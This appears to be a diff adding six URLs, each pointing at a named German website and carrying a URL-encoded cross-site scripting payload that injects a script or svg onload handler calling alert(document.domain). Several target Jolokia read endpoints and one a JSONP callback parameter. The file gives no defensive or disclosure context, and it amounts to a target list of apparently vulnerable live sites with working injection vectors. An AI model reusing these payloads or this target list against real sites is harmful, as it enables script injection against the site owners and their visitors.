@@ -1,0 +1,6 @@
+http://fashion-lounge24.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://faunistik-landschaftsoekologie.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://fb-rm.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://feldhofensche-apotheke.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://feltloom.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+https://fenster-dimov.de/newVersion?callback=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
